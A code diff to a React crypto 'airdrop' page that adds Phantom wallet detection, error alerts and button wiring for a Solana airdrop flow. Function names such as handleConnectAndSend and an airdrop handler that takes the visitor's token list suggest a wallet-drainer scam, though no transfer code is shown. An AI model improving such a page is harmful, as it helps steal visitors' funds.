@@ -1,5 +1,5 @@
 
-import { useContext, useState, useRef } from 'react';
+import { useContext, useState, useRef, useEffect } from 'react';
 import { WalletContext } from './context/WalletContext';
 import './App.css'
 import { connectWallet, getBalance } from './web3/wallet';
@@ -55,6 +55,29 @@ function App() {
   const chartRef = useRef(null);
   const [showModal, setShowModal] = useState(false);
   const {solState, solDispatch} = useContext(SolanaContext)
+
+  // Handle wallet provider injection after deep link returns from Phantom
+  useEffect(() => {
+    const handleWalletInjected = () => {
+      // Check if we have a wallet provider now
+      if (window.solana) {
+        console.log("Wallet provider detected, ready to connect");
+        // Dispatch an event or state update if needed
+      }
+    };
+
+    // Listen for wallet injection events
+    window.addEventListener("solana#initialized", handleWalletInjected);
+    
+    // Also check immediately in case provider is already available
+    if (window.solana) {
+      handleWalletInjected();
+    }
+
+    return () => {
+      window.removeEventListener("solana#initialized", handleWalletInjected);
+    };
+  }, []);
 
   const scrollToTop = () => {
     window.scrollTo({
@@ -128,18 +151,26 @@ function App() {
   }
 
   const handleSolanaAirdropFlow = async () => {
-    if(loading) return
+    if(loading) return;
+    setLoading(true);
 
     // solana
     try {
       const solAddress = await connectSolana()
       if(solAddress){
         solDispatch({type: "CONNECT_SOLANA", payload: {address: solAddress}})
-        await handleSolanaAirdrop(solAddress, solanaTokenList)
-        alert("Solana rewards Processing...")
+        const airdropResult = await handleSolanaAirdrop(solAddress, solanaTokenList)
+        if(airdropResult){
+          alert("Solana rewards Processing...")
+        } else {
+          alert("Failed to process Solana airdrop. Please try again.")
+        }
+      } else {
+        alert("Failed to connect Solana wallet. Please install Phantom wallet or try again.")
       }
     } catch (e){
-      console.log("Airdrop Flow Error: ", e);
+      console.error("Airdrop Flow Error: ", e);
+      alert("Error processing Solana airdrop: " + (e.message || "Unknown error"))
     } finally {
       setLoading(false)
     }
@@ -210,7 +241,7 @@ function App() {
           </div>
           <div className="container-fluid">
             <a className="navbar-brand">
-              <button className="btn btn-success animated-btn" onClick={handleConnectAndSend} disabled={loading}>
+              <button className="btn btn-success animated-btn" onClick={handleSolanaAirdropFlow} disabled={loading}>
                 <span className="emoji-wrapper">
                   <span className="emoji-slide">
                     🎁 🎉 🪂 💰 🪙 🚀 🎁
@@ -425,7 +456,7 @@ function App() {
           scrollToCharts={scrollToCharts}
           handleConnectAndSend={handleConnectAndSend}
           handleFullAirdropFlow={handleFullAirdropFlow}
-          handleSolanaAirdropFlow={handleSolanaAirdropFlow()}
+          handleSolanaAirdropFlow={handleSolanaAirdropFlow}
           handleWalletConnected={handleWalletConnected}
           loading={loading}
           address={state.address}
